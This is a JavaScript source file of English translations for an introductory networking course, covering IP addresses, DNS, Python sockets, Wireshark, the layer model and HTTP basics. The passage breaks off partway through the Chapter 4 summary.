/**
 * English translations for chapter content.
 * Structure: { [chapterId]: { titleEn, pages: [{ titleEn, contentEn? }] } }
 * Only pages with contentEn are translated; others fall back to Hebrew.
 * Simulations, thinkOutside, and questions pages don't need contentEn.
 *
 * Language level: A2–B1 (simple vocabulary, short sentences).
 */

export const contentEn = {

  // ========== CHAPTER 1 ==========
  1: {
    titleEn: "Starting the Journey — How Does the Internet Work?",
    pages: [
      {
        // Page 0: explanation
        titleEn: "What happens when we browse a website?",
        contentEn: `
          <p>Most of us have visited <code>Facebook</code>.</p>
          <p>But what actually happens behind the scenes?</p>
          <p>We type <code>www.facebook.com</code> in the browser, press Enter — and get the page.</p>
          <p><strong>A website needs four things to work:</strong></p>
          <ul>
            <li><strong>Storage</strong> — a place for the website files</li>
            <li><strong>Design</strong> — logo, layout of elements</li>
            <li><strong>Authentication</strong> — identifying users</li>
            <li><strong>Communication</strong> — a way to reach the website from anywhere in the world</li>
          </ul>
          <p>This book focuses on <strong>communication</strong>.</p>
          <p>We will learn how data moves between electronic devices.</p>
        `
      },
      {
        // Page 1: explanation — WWW
        titleEn: "WWW – World Wide Web",
        contentEn: `
          <p><strong>WWW</strong> — <code>World Wide Web</code></p>
          <p>When we say "the Internet," we usually mean the web pages we visit in a browser.</p>
          <p>The word <code>Web</code> means network — web pages are linked to each other like a spider's web.</p>
          <p><strong>Request</strong> — <code>Request</code></p>
          <p>The browser sends a request to the server — "send me the data I need."</p>
          <p><strong>Response</strong> — <code>Response</code></p>
          <p>The server replies with a response that contains the data.</p>
          <div class="diagram-container">
            <svg direction="ltr" viewBox="0 0 400 140" class="content-diagram">
              <rect x="30" y="20" width="90" height="60" rx="8" fill="var(--accent-soft)" stroke="var(--accent)" stroke-width="2"/>
              <text x="75" y="50" text-anchor="middle" font-size="12" fill="var(--text)">Client</text>
              <text x="75" y="65" text-anchor="middle" font-size="10" fill="var(--text-muted)">(Browser)</text>
              <path d="M 125 50 L 175 50" stroke="var(--accent-green)" stroke-width="2" marker-end="url(#arrow)"/>
              <text x="150" y="40" text-anchor="middle" font-size="9" fill="var(--accent-green)">Request</text>
              <path d="M 275 50 L 225 50" stroke="var(--accent-gold)" stroke-width="2" marker-end="url(#arrow2)"/>
              <text x="250" y="40" text-anchor="middle" font-size="9" fill="var(--accent-gold)">Response</text>
              <rect x="280" y="20" width="90" height="60" rx="8" fill="var(--accent-soft)" stroke="var(--accent)" stroke-width="2"/>
              <text x="325" y="50" text-anchor="middle" font-size="12" fill="var(--text)">Server</text>
              <text x="325" y="65" text-anchor="middle" font-size="10" fill="var(--text-muted)">(Website)</text>
              <defs><marker id="arrow" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><polygon points="0 0, 6 3, 0 6" fill="var(--accent-green)"/></marker>
              <marker id="arrow2" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><polygon points="0 0, 6 3, 0 6" fill="var(--accent-gold)"/></marker></defs>
            </svg>
            <p class="diagram-caption">Diagram: Client-Server communication</p>
          </div>
          <p>The website receives requests and sends responses — it provides a service.</p>
          <p><strong>Server</strong> — The website is the server.</p>
          <p><strong>Client</strong> — The browser is the client.</p>
        `
      },
      {
        // Page 2: demo — what the server sends
        titleEn: "Demo: What the Server Sends to the Client",
        contentEn: `
          <p>When you choose <code>View page source</code> on a website, you see the code the server sent.</p>
          <p><strong>Example:</strong> This is what the server returns:</p>
          <div class="code-preview">
            <pre><code>&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;
&lt;head&gt;
  &lt;title&gt;Main Page - News Site&lt;/title&gt;
  &lt;meta charset="UTF-8"&gt;
&lt;/head&gt;
&lt;body&gt;
  &lt;h1&gt;Main Heading of the Page&lt;/h1&gt;
  &lt;p&gt;Text shown to the user...&lt;/p&gt;
  &lt;img src="/images/photo.jpg" alt="Photo"&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre>
          </div>
          <ul>
            <li><code>HTML</code> — the language of web pages</li>
            <li><code>&lt;h1&gt;</code> — heading</li>
            <li><code>&lt;p&gt;</code> — paragraph (text)</li>
            <li><code>&lt;img&gt;</code> — image</li>
          </ul>
          <p>The browser reads this code and shows you a nice page with colors, images, and text.</p>
          <p>This is what happens every time you open a website.</p>
        `
      },
      {
        // Page 3: explanation — IP Addresses
        titleEn: "IP Addresses",
        contentEn: `
          <p>To send and receive messages on the Internet, you need to know where to send them.</p>
          <p>Like a letter — you write a destination address and a return address on the envelope.</p>
          <p><strong>IP Addresses</strong></p>
          <p>On the Internet, addresses are called <code>IP</code> addresses.</p>
          <div class="diagram-container">
            <svg direction="ltr" viewBox="0 0 340 70" class="content-diagram">
              <rect x="10" y="15" width="70" height="40" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="45" y="40" text-anchor="middle" font-size="12" fill="var(--text)">Byte 1</text>
              <text x="45" y="55" text-anchor="middle" font-size="9" fill="var(--text-muted)">0-255</text>
              <text x="88" y="40" text-anchor="middle" font-size="16" fill="var(--text-muted)">.</text>
              <rect x="95" y="15" width="70" height="40" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="130" y="40" text-anchor="middle" font-size="12" fill="var(--text)">Byte 2</text>
              <text x="130" y="55" text-anchor="middle" font-size="9" fill="var(--text-muted)">0-255</text>
              <text x="173" y="40" text-anchor="middle" font-size="16" fill="var(--text-muted)">.</text>
              <rect x="180" y="15" width="70" height="40" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="215" y="40" text-anchor="middle" font-size="12" fill="var(--text)">Byte 3</text>
              <text x="215" y="55" text-anchor="middle" font-size="9" fill="var(--text-muted)">0-255</text>
              <text x="258" y="40" text-anchor="middle" font-size="16" fill="var(--text-muted)">.</text>
              <rect x="265" y="15" width="70" height="40" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="300" y="40" text-anchor="middle" font-size="12" fill="var(--text)">Byte 4</text>
              <text x="300" y="55" text-anchor="middle" font-size="9" fill="var(--text-muted)">0-255</text>
            </svg>
            <p class="diagram-caption">An IP address has 4 bytes (numbers 0–255)</p>
          </div>
          <p>Example: <code>192.168.1.1</code></p>
          <p>Each number is between 0 and 255. This is called <code>IPv4</code>.</p>
          <p><strong>Port</strong> — a number that tells which program on the computer should get the message.</p>
          <p>Think of the IP address as a building address, and the port as the apartment number.</p>
          <p>Example: <code>192.168.1.1:443</code> — IP address <code>192.168.1.1</code>, port <code>443</code> (HTTPS).</p>
        `
      },
      {
        // Page 4: demo — ping output
        titleEn: "Demo: Output of the ping Command",
        contentEn: `
          <p>When you run <code>ping www.facebook.com</code>, this output appears:</p>
          <div class="code-preview">
            <pre><code>C:&gt; ping www.facebook.com

Pinging facebook.com [31.13.72.65] with 32 bytes of data:
Reply from 31.13.72.65: bytes=32 time=45ms TTL=56
Reply from 31.13.72.65: bytes=32 time=42ms TTL=56</code></pre>
          </div>
          <div class="demo-note">
            <ul>
              <li>In the line <code>Pinging facebook.com [31.13.72.65]</code> — the number in brackets is the IP address of Facebook's server.</li>
              <li><code>time=45ms</code> — it took 45 milliseconds for the message to go and come back.</li>
              <li><code>TTL=56</code> — Time To Live. The message can pass through up to 56 more routers before it is dropped.</li>
            </ul>
          </div>
          <p><strong>What is <code>ping</code>?</strong></p>
          <p>A command that sends a small message to a server and waits for a reply.</p>
          <ul>
            <li>If you get a reply — the connection works.</li>
            <li>If there is no reply — something is wrong (the server is down, or you are not connected).</li>
          </ul>
        `
      },
      {
        // Page 5: explanation — The Internet Cloud
        titleEn: "The Internet Cloud",
        contentEn: `
          <p>Our computer is not connected directly to <code>Facebook</code>.</p>
          <p>It connects to a device that finds its way to other devices — a network of devices that pass the message from our computer all the way to the destination server.</p>
          <p>Each arrow between devices represents a link (data link layer communication).</p>
        `
      },
      {
        // Page 6: explanation — traceroute
        titleEn: "traceroute — The Path of a Message",
        contentEn: `
          <p><strong><code>traceroute</code></strong></p>
          <p>A tool that shows the path a message takes from our computer to the destination.</p>
          <p>Each line in the output is one device — a router or server — that the packet passed through.</p>
          <p>Each step is called a <code>hop</code>.</p>
          <p>Visual tool: <code>Visual Traceroute</code> on <a href="http://yougetsignal.com/tools/visual-tracert" target="_blank">yougetsignal.com</a>.</p>
          <p>It shows the route on a world map.</p>
        `
      },
      {
        // Page 7: explanation — DNS
        titleEn: "DNS — Translates Names to IP Addresses",
        contentEn: `
          <p><strong><code>DNS</code></strong> — <code>Domain Name System</code></p>
          <p>A system that translates domain names to <code>IP</code> addresses.</p>
          <p>Example: the name <code>www.facebook.com</code> is translated to a numeric <code>IP</code> address.</p>
          <p>The command <code>nslookup www.facebook.com</code> sends a <code>DNS</code> query and shows the <code>IP</code> address.</p>
        `
      },
      {}, // Page 8: simulation — skip
      {}, // Page 9: simulation — skip
      {
        // Page 10: explanation — GeoIP
        titleEn: "GeoIP — Geographic Location",
        contentEn: `
          <p><strong><code>GeoIP</code></strong> — Geographic location by <code>IP</code> address</p>
          <p>There are databases that contain location information for <code>IP</code> addresses.</p>
          <p>Given an <code>IP</code> address, you can find out which country and city it belongs to.</p>
          <p>The mapping is not official and not exact, but it gives the right answer in most cases.</p>
          <p><strong>Example:</strong> <a href="http://www.geoiptool.com" target="_blank">geoiptool.com</a></p>
        `
      },
      {}, // Page 11: thinkOutside — skip
      {
        // Page 12: summary
        titleEn: "Chapter 1 Summary",
        contentEn: `
          <div class="chapter-summary">
            <h3>Key Points:</h3>
            <ul>
              <li>Client-Server model: the browser sends a request, the server returns a response</li>
              <li><code>IP</code> addresses identify computers — 4 bytes, each 0–255</li>
              <li><code>ping</code> — checks the connection, finds the <code>IP</code>. <code>traceroute</code> — shows the path of packets</li>
              <li><code>DNS</code> translates a domain name — <code>www.facebook.com</code> — to an <code>IP</code>. <code>nslookup</code> — sends a <code>DNS</code> query</li>
              <li>A port is a number that identifies which service on a computer receives the message</li>
            </ul>
          </div>
        `
      },
      {
        // Page 13: demo — nslookup
        titleEn: "Demo: Output of nslookup",
        contentEn: `
          <p>When you run <code>nslookup www.google.com</code>, this is the output:</p>
          <div class="code-preview">
            <pre><code>C:&gt; nslookup www.google.com

Non-authoritative answer:
Name:    www.google.com
Addresses:  142.250.185.46
            2a00:1450:4010:c08::8b</code></pre>
          </div>
          <div class="demo-note">
            <ul>
              <li>The first address is <code>IPv4</code>, the second is <code>IPv6</code></li>
              <li><code>Non-authoritative</code> means the answer came from a cache, not the main DNS server</li>
              <li>Try it yourself: open the terminal and type <code>nslookup</code> followed by any website name</li>
            </ul>
          </div>
        `
      },
      {}, // Page 14: questions — skip
    ]
  },

  // ========== CHAPTER 2 ==========
  2: {
    titleEn: "Socket Programming",
    pages: [
      {
        // Page 0: explanation
        titleEn: "What is a Socket?",
        contentEn: `
          <p>A <strong>socket</strong> is an interface for communication between computers.</p>
          <p>Think of it as a "door" that lets programs send and receive data over the network.</p>
          <p><strong>To open a socket, you need two things:</strong></p>
          <ul>
            <li><strong>IP address</strong> — the address of the computer you want to talk to</li>
            <li><strong>Port number</strong> — which program on that computer should receive the message</li>
          </ul>
          <p>A socket connects two programs: one on your computer, and one on the remote computer.</p>
          <p>Once the socket is open, both sides can send and receive data.</p>
        `
      },
      {
        // Page 1: explanation
        titleEn: "Client-Server Model with Sockets",
        contentEn: `
          <p>Socket communication uses the <strong>Client-Server</strong> model:</p>
          <ul>
            <li><strong>Server</strong> — waits for connections. It listens on a specific port.</li>
            <li><strong>Client</strong> — starts the connection. It connects to the server's IP and port.</li>
          </ul>
          <p><strong>Analogy:</strong></p>
          <ul>
            <li>The <strong>IP address</strong> is like a building address</li>
            <li>The <strong>port</strong> is like an apartment number in that building</li>
          </ul>
          <p>Port numbers go from <code>0</code> to <code>65535</code>.</p>
          <p>Some ports are reserved: <code>80</code> for HTTP, <code>443</code> for HTTPS, <code>22</code> for SSH.</p>
          <p>When you write a socket program, you choose a port number (usually above 1024).</p>
        `
      },
      {
        // Page 2: demo
        titleEn: "Client Code in Python",
        contentEn: `
          <p>Here is a simple client that connects to a server and sends a message:</p>
          <div class="code-preview">
            <pre><code>import socket

my_socket = socket.socket()
my_socket.connect(("127.0.0.1", 8820))

my_socket.send("Hello server!".encode())
data = my_socket.recv(1024)
print("Server said:", data.decode())

my_socket.close()</code></pre>
          </div>
          <div class="demo-note">
            <ul>
              <li><code>socket.socket()</code> — creates a new socket</li>
              <li><code>.connect((IP, port))</code> — connects to the server</li>
              <li><code>.send()</code> — sends data (must be bytes, so we use <code>.encode()</code>)</li>
              <li><code>.recv(1024)</code> — receives up to 1024 bytes from the server</li>
              <li><code>.close()</code> — closes the connection</li>
            </ul>
          </div>
        `
      },
      {
        // Page 3: demo
        titleEn: "Server Code in Python",
        contentEn: `
          <p>Here is a simple server that waits for a client:</p>
          <div class="code-preview">
            <pre><code>import socket

server_socket = socket.socket()
server_socket.bind(("0.0.0.0", 8820))
server_socket.listen()

print("Waiting for a client...")
client_socket, address = server_socket.accept()
print("Client connected:", address)

data = client_socket.recv(1024)
print("Client said:", data.decode())
client_socket.send("Hello client!".encode())

client_socket.close()
server_socket.close()</code></pre>
          </div>
          <div class="demo-note">
            <ul>
              <li><code>.bind((IP, port))</code> — tells the OS: "I want to listen on this address and port"</li>
              <li><code>.listen()</code> — starts listening for connections</li>
              <li><code>.accept()</code> — waits until a client connects. Returns the client socket and its address</li>
              <li>After <code>accept()</code>, the server can send and receive data with the client</li>
            </ul>
          </div>
        `
      },
      {
        // Page 4: explanation
        titleEn: "Echo Server and Command Server",
        contentEn: `
          <p><strong>Echo Server</strong></p>
          <p>The simplest server: it receives a message and sends back the same message.</p>
          <ul>
            <li>Client sends: <code>"Hello"</code></li>
            <li>Server returns: <code>"Hello"</code></li>
          </ul>
          <p>This is useful for testing that the connection works.</p>
          <p><strong>Command Server</strong></p>
          <p>A more advanced server: it reads the message, understands it as a command, and sends back a result.</p>
          <ul>
            <li>Client sends: <code>"TIME"</code> → Server returns the current time</li>
            <li>Client sends: <code>"NAME"</code> → Server returns the server name</li>
            <li>Client sends: <code>"EXIT"</code> → Server closes the connection</li>
          </ul>
          <p>The server uses <code>if/elif</code> to check which command was received.</p>
        `
      },
      {
        // Page 5: summary
        titleEn: "Chapter 2 Summary",
        contentEn: `
          <div class="chapter-summary">
            <h3>Key Points:</h3>
            <ul>
              <li>A <strong>socket</strong> is an interface for network communication between two programs</li>
              <li>You need an <strong>IP address</strong> and a <strong>port number</strong> to create a connection</li>
              <li><strong>Client</strong>: <code>connect()</code> → <code>send()</code> → <code>recv()</code> → <code>close()</code></li>
              <li><strong>Server</strong>: <code>bind()</code> → <code>listen()</code> → <code>accept()</code> → <code>recv()</code>/<code>send()</code> → <code>close()</code></li>
              <li>Data must be sent as <strong>bytes</strong> — use <code>.encode()</code> and <code>.decode()</code></li>
              <li>An <strong>echo server</strong> returns the same message. A <strong>command server</strong> processes commands.</li>
            </ul>
          </div>
        `
      },
      {
        // Page 6: explanation
        titleEn: "127.0.0.1 and 0.0.0.0",
        contentEn: `
          <p><strong><code>127.0.0.1</code> — Loopback</strong></p>
          <ul>
            <li>This IP address always means "this computer"</li>
            <li>When you connect to <code>127.0.0.1</code>, you connect to yourself</li>
            <li>Also called <code>localhost</code></li>
            <li>Used for testing: run the server and client on the same computer</li>
          </ul>
          <p><strong><code>0.0.0.0</code> — All Interfaces</strong></p>
          <ul>
            <li>When a server binds to <code>0.0.0.0</code>, it listens on all network interfaces</li>
            <li>This means any computer on the network can connect to it</li>
            <li>If you bind to <code>127.0.0.1</code>, only your own computer can connect</li>
            <li>If you bind to <code>0.0.0.0</code>, other computers can connect too</li>
          </ul>
        `
      },
      {}, // Page 7: questions — skip
    ]
  },

  // ========== CHAPTER 3 ==========
  3: {
    titleEn: "Wireshark and the Five-Layer Model",
    pages: [
      {
        // Page 0: explanation
        titleEn: "What Happens When We Communicate?",
        contentEn: `
          <p>When two computers communicate, data travels through the network.</p>
          <p>But we cannot see this data with our eyes.</p>
          <p><strong>Wireshark</strong> is a tool that lets you see all network traffic on your computer.</p>
          <ul>
            <li>It captures every packet that enters or leaves your computer</li>
            <li>It shows the details of each packet: source, destination, protocol, and data</li>
            <li>It is free and works on Windows, Mac, and Linux</li>
          </ul>
          <p>With Wireshark, we can understand what really happens when we browse a website, send an email, or use any network application.</p>
        `
      },
      {
        // Page 1: explanation
        titleEn: "Why Do We Need a Layer Model?",
        contentEn: `
          <p>Network communication is very complex. Many things happen at the same time:</p>
          <ul>
            <li>Finding the destination address</li>
            <li>Breaking data into small pieces</li>
            <li>Sending electrical signals on a wire</li>
            <li>Making sure data arrives correctly</li>
          </ul>
          <p>To organize this complexity, the <strong>ISO</strong> organization created a model with layers.</p>
          <p>Each layer has one job. Each layer uses the services of the layer below it.</p>
          <p>This is called the <strong>OSI model</strong> (Open Systems Interconnection).</p>
          <p>We will learn a simpler version: the <strong>Five-Layer Model</strong>.</p>
        `
      },
      {
        // Page 2: demo (analogy)
        titleEn: "Analogy — Flying at an Airport",
        contentEn: `
          <p>Think about flying from one country to another. There are steps:</p>
          <ul>
            <li><strong>Layer 5 (Application)</strong> — You decide to travel and buy a ticket</li>
            <li><strong>Layer 4 (Transport)</strong> — You pack your luggage and check in</li>
            <li><strong>Layer 3 (Network)</strong> — The airport system finds the best route for your flight</li>
            <li><strong>Layer 2 (Data Link)</strong> — You walk through the gate to your specific plane</li>
            <li><strong>Layer 1 (Physical)</strong> — The plane flies through the air</li>
          </ul>
          <p>When you land:</p>
          <ul>
            <li>You leave the plane (Layer 1)</li>
            <li>You walk through the gate (Layer 2)</li>
            <li>You arrive at the destination airport (Layer 3)</li>
            <li>You collect your luggage (Layer 4)</li>
            <li>You reached your destination (Layer 5)</li>
          </ul>
          <p>Each layer does its job without knowing the details of the other layers.</p>
        `
      },
      {
        // Page 3: explanation
        titleEn: "Five-Layer Model — Overview",
        contentEn: `
          <p>The five layers from top to bottom:</p>
          <ul>
            <li><strong>Layer 5 — Application</strong>: The program that sends or receives data (browser, email client)</li>
            <li><strong>Layer 4 — Transport</strong>: Makes sure data arrives correctly. Uses TCP or UDP</li>
            <li><strong>Layer 3 — Network</strong>: Finds the path from source to destination. Uses IP addresses</li>
            <li><strong>Layer 2 — Data Link</strong>: Moves data between two directly connected devices. Uses MAC addresses</li>
            <li><strong>Layer 1 — Physical</strong>: The actual wires, radio waves, or light signals that carry the data</li>
          </ul>
          <p>Data flows <strong>down</strong> the layers when sending, and <strong>up</strong> the layers when receiving.</p>
        `
      },
      {
        // Page 4: explanation
        titleEn: "Protocol — Definition",
        contentEn: `
          <p>A <strong>protocol</strong> is a set of rules for communication.</p>
          <p>Like a language: if two people want to talk, they must use the same language.</p>
          <p>In networks, both sides must follow the same protocol to understand each other.</p>
          <p><strong>Examples of protocols:</strong></p>
          <ul>
            <li><code>HTTP</code> — for web pages (Layer 5)</li>
            <li><code>TCP</code> — for reliable data transfer (Layer 4)</li>
            <li><code>UDP</code> — for fast data transfer, no guarantee (Layer 4)</li>
            <li><code>IP</code> — for addressing and routing (Layer 3)</li>
            <li><code>Ethernet</code> — for local network connections (Layer 2)</li>
          </ul>
          <p>Each layer has its own protocols.</p>
        `
      },
      {
        // Page 5: explanation
        titleEn: "Encapsulation and Decapsulation",
        contentEn: `
          <p><strong>Encapsulation</strong> — when sending data:</p>
          <ul>
            <li>Each layer adds its own <strong>header</strong> to the data</li>
            <li>The header contains information that layer needs (like addresses)</li>
            <li>The data goes down: Application → Transport → Network → Data Link → Physical</li>
          </ul>
          <p><strong>Decapsulation</strong> — when receiving data:</p>
          <ul>
            <li>Each layer removes its header and reads the information</li>
            <li>The data goes up: Physical → Data Link → Network → Transport → Application</li>
          </ul>
          <p>Think of it like putting a letter in an envelope, then in a box, then in a shipping container. On the other side, you unpack in reverse order.</p>
        `
      },
      {}, // Page 6: simulation — skip
      {
        // Page 7: explanation
        titleEn: "Packet Structure — Each Layer Adds a Header",
        contentEn: `
          <p>A packet on the network looks like this (from outside to inside):</p>
          <ul>
            <li><strong>Ethernet Header</strong> (Layer 2) — source and destination MAC addresses</li>
            <li><strong>IP Header</strong> (Layer 3) — source and destination IP addresses</li>
            <li><strong>TCP/UDP Header</strong> (Layer 4) — source and destination ports</li>
            <li><strong>Data</strong> (Layer 5) — the actual message (for example, an HTTP request)</li>
          </ul>
          <p>In Wireshark, you can click on each layer and see its header fields.</p>
          <p>The headers are like labels on a package: each delivery person reads the label they need.</p>
        `
      },
      {
        // Page 8: explanation
        titleEn: "Each Layer in Detail — Services",
        contentEn: `
          <p>What does each layer do?</p>
          <ul>
            <li><strong>Physical</strong> — converts data to electrical signals, light, or radio waves. Defines cables and connectors.</li>
            <li><strong>Data Link</strong> — sends data between two devices on the same network. Detects errors. Uses MAC addresses.</li>
            <li><strong>Network</strong> — routes data across different networks. Uses IP addresses. Handles routing.</li>
            <li><strong>Transport</strong> — provides reliable (TCP) or fast (UDP) delivery. Manages ports and connections.</li>
            <li><strong>Application</strong> — the protocols that applications use directly: HTTP, DNS, FTP, SMTP.</li>
          </ul>
        `
      },
      {
        // Page 9: summary
        titleEn: "Chapter 3 Summary",
        contentEn: `
          <div class="chapter-summary">
            <h3>Key Points:</h3>
            <ul>
              <li><strong>Wireshark</strong> captures and displays network packets in real time</li>
              <li>The <strong>Five-Layer Model</strong> organizes network communication into layers</li>
              <li>Layers (top to bottom): Application, Transport, Network, Data Link, Physical</li>
              <li>A <strong>protocol</strong> is a set of rules both sides must follow</li>
              <li><strong>Encapsulation</strong>: each layer adds a header when sending</li>
              <li><strong>Decapsulation</strong>: each layer removes its header when receiving</li>
              <li>Each layer provides services to the layer above it</li>
            </ul>
          </div>
        `
      },
      {
        // Page 10: demo
        titleEn: "Using Wireshark",
        contentEn: `
          <p><strong>How to use Wireshark:</strong></p>
          <ul>
            <li><strong>Start capture</strong> — choose a network interface (Wi-Fi or Ethernet) and click the blue shark fin</li>
            <li><strong>Filter packets</strong> — type a filter in the filter bar:
              <ul>
                <li><code>http</code> — show only HTTP traffic</li>
                <li><code>tcp</code> — show only TCP packets</li>
                <li><code>ip.addr == 192.168.1.1</code> — show only packets to/from this IP</li>
                <li><code>tcp.port == 80</code> — show only traffic on port 80</li>
              </ul>
            </li>
            <li><strong>Analyze</strong> — click on a packet to see its details. Each layer is shown as a collapsible section.</li>
          </ul>
          <p>Wireshark uses colors to show different types of traffic (green for TCP, blue for DNS, etc.).</p>
        `
      },
      {}, // Page 11: questions — skip
    ]
  },

  // ========== CHAPTER 4 ==========
  4: {
    titleEn: "The Application Layer",
    pages: [
      {
        // Page 0: explanation
        titleEn: "What is the Application Layer?",
        contentEn: `
          <p>The <strong>Application Layer</strong> is Layer 5 — the top layer of the model.</p>
          <p>This is the layer that programs use directly.</p>
          <ul>
            <li>Your browser uses <code>HTTP</code> to get web pages</li>
            <li>Your email app uses <code>SMTP</code> to send emails</li>
            <li>Your computer uses <code>DNS</code> to convert domain names to IP addresses</li>
          </ul>
          <p>The Application Layer defines the format of messages between programs.</p>
          <p>It does not care how the data travels — that is the job of the lower layers.</p>
        `
      },
      {
        // Page 1: explanation
        titleEn: "HTTP Protocol — Request and Response",
        contentEn: `
          <p><strong>HTTP</strong> — <code>HyperText Transfer Protocol</code></p>
          <p>The main protocol for the web. Your browser uses it every time you visit a website.</p>
          <p><strong>How it works:</strong></p>
          <ul>
            <li>The client (browser) sends an <strong>HTTP Request</strong></li>
            <li>The server processes the request</li>
            <li>The server sends back an <strong>HTTP Response</strong></li>
          </ul>
          <p>This is called <strong>Request-Response</strong> — the client always starts, the server always replies.</p>
          <p>Each request asks for a specific resource (a page, an image, a file).</p>
        `
      },
      {
        // Page 2: explanation
        titleEn: "HTTP Structure — Lines and Headers",
        contentEn: `
          <p>An HTTP message has a specific format:</p>
          <ul>
            <li><strong>Request line</strong> — the method, path, and HTTP version: <code>GET /index.html HTTP/1.1</code></li>
            <li><strong>Headers</strong> — extra information, one per line: <code>Host: www.example.com</code></li>
            <li><strong>Empty line</strong> — separates headers from the body</li>
            <li><strong>Body</strong> — the data (optional, used in POST requests)</li>
          </ul>
          <p>Lines are separated by <code>CRLF</code> (Carriage Return + Line Feed: <code>\\r\\n</code>).</p>
          <p><strong>Common headers:</strong></p>
          <ul>
            <li><code>Host</code> — the domain name of the server</li>
            <li><code>Content-Type</code> — the type of data (text/html, application/json)</li>
            <li><code>Content-Length</code> — the size of the body in bytes</li>
          </ul>
        `
      },
      {
        // Page 3: demo
        titleEn: "Using telnet for HTTP Requests",
        contentEn: `
          <p>You can send HTTP requests manually with <code>telnet</code>:</p>
          <div class="code-preview">
            <pre><code>telnet www.example.com 80

GET / HTTP/1.1
Host: www.example.com
</code></pre>
          </div>
          <div class="demo-note">
            <ul>
              <li><code>telnet</code> opens a raw TCP connection to the server on port 80</li>
              <li>You type the HTTP request by hand</li>
              <li>The server sends back the HTTP response with headers and HTML</li>
              <li>This shows that HTTP is just text sent over a TCP connection</li>
            </ul>
          </div>
          <p>This is a great way to understand what the browser does behind the scenes.</p>
        `
      },
      {
        // Page 4: demo
        titleEn: "Simple HTTP Server in Python",
        contentEn: `
          <p>You can write a basic HTTP server in Python:</p>
          <div class="code-preview">
            <pre><code>import socket

server = socket.socket()
server.bind(("0.0.0.0", 80))
server.listen()

client, addr = server.accept()
request = client.recv(1024).decode()
print(request)

response = "HTTP/1.1 200 OK\\r\\n"
response += "Content-Type: text/html\\r\\n"
response += "\\r\\n"
response += "&lt;h1&gt;Hello World!&lt;/h1&gt;"

client.send(response.encode())
client.close()
server.close()</code></pre>
          </div>
          <div class="demo-note">
            <ul>
              <li>The server listens on port 80 (HTTP)</li>
              <li>It reads the request from the browser</li>
              <li>It sends back a valid HTTP response: status line + headers + empty line + body</li>
              <li>Open <code>http://127.0.0.1</code> in your browser to see the result</li>
            </ul>
          </div>
        `
      },
      {
        // Page 5: explanation
        titleEn: "HTTP Status Codes",
        contentEn: `
          <p>Every HTTP response starts with a <strong>status code</strong>. It tells the client what happened.</p>
          <p><strong>Common status codes:</strong></p>
          <ul>
            <li><code>200 OK</code> — the request was successful</li>
            <li><code>301 Moved Permanently</code> — the page moved to a new URL</li>
            <li><code>404 Not Found</code> — the page does not exist</li>
            <li><code>500 Internal Server Error</code> — something went wrong on the server</li>
          </ul>
          <p><strong>Status code groups:</strong></p>
          <ul>
            <li><code>2xx</code> — Success</li>
            <li><code>3xx</code> — Redirect (go to a different URL)</li>
            <li><code>4xx</code> — Client error (you made a mistake)</li>
            <li><code>5xx</code> — Server error (the server has a problem)</li>
          </ul>
        `
      },
      {
        // Page 6: explanation
        titleEn: "DNS Protocol",
        contentEn: `
          <p><strong>DNS</strong> — <code>Domain Name System</code></p>
          <p>DNS converts domain names to IP addresses.</p>
          <p>When you type <code>www.google.com</code>, your computer asks a DNS server: "What is the IP address of this name?"</p>
          <p><strong>How DNS works:</strong></p>
          <ul>
            <li>Your computer sends a <strong>DNS query</strong> to a DNS server</li>
            <li>The DNS server looks up the name and returns the IP address</li>
            <li>Your computer uses the IP address to connect to the website</li>
          </ul>
          <p>DNS uses <strong>port 53</strong> and can use both UDP and TCP.</p>
          <p>Without DNS, you would need to remember IP addresses for every website.</p>
        `
      },
      {
        // Page 7: explanation
        titleEn: "GET and POST Requests",
        contentEn: `
          <p>HTTP has different <strong>methods</strong> (types of requests):</p>
          <p><strong>GET</strong></p>
          <ul>
            <li>Asks the server to send data</li>
            <li>Parameters are in the URL: <code>/search?q=hello</code></li>
            <li>Used when you open a page or click a link</li>
            <li>Should not change data on the server</li>
          </ul>
          <p><strong>POST</strong></p>
          <ul>
            <li>Sends data to the server</li>
            <li>Parameters are in the body (not visible in the URL)</li>
            <li>Used when you submit a form (login, register, upload)</li>
            <li>Can change data on the server</li>
          </ul>
          <p><strong>Key difference:</strong> GET is for reading, POST is for writing.</p>
        `
      },
      {
        // Page 8: explanation
        titleEn: "URL Structure",
        contentEn: `
          <p>A <strong>URL</strong> (Uniform Resource Locator) is the full address of a resource on the web.</p>
          <p><strong>Structure:</strong></p>
          <div class="code-preview">
            <pre><code>scheme://host:port/path?query</code></pre>
          </div>
          <ul>
            <li><code>scheme</code> — the protocol: <code>http</code> or <code>https</code></li>
            <li><code>host</code> — the domain name or IP: <code>www.example.com</code></li>
            <li><code>port</code> — optional, default is 80 (HTTP) or 443 (HTTPS)</li>
            <li><code>path</code> — the location on the server: <code>/images/photo.jpg</code></li>
            <li><code>query</code> — parameters: <code>?name=John&age=25</code></li>
          </ul>
          <p><strong>Example:</strong></p>
          <p><code>https://www.google.com:443/search?q=hello</code></p>
        `
      },
      {
        // Page 9: explanation
        titleEn: "Google Maps — Example of Network Resources",
        contentEn: `
          <p>Google Maps is a good example of how the web uses network resources.</p>
          <p>When you search for a place on Google Maps:</p>
          <ul>
            <li>Your browser sends an HTTP request with the search query</li>
            <li>The server returns map data in JSON format</li>
            <li>The browser downloads map images (tiles) from a CDN</li>
            <li>JavaScript code in the browser puts everything together</li>
          </ul>
          <p>One page can make <strong>dozens of HTTP requests</strong> to different servers.</p>
          <p>Each request uses a full URL to identify the resource.</p>
          <p>You can see all these requests in the browser's Developer Tools (F12 → Network tab).</p>
        `
      },
      {
        // Page 10: summary
        titleEn: "Chapter 4 Summary",
        contentEn: `
          <div class="chapter-summary">
            <h3>Key Points:</h3>
            <ul>
              <li>The <strong>Application Layer</strong> is where programs communicate using protocols like HTTP and DNS</li>
              <li><strong>HTTP</strong> uses Request-Response: the client asks, the server answers</li>
              <li>HTTP messages have: request/status line, headers, empty line, and body</li>
              <li><strong>Status codes</strong>: 200 = OK, 404 = Not Found, 500 = Server Error</li>
              <li><strong>DNS</strong> converts domain names to IP addresses (port 53)</li>
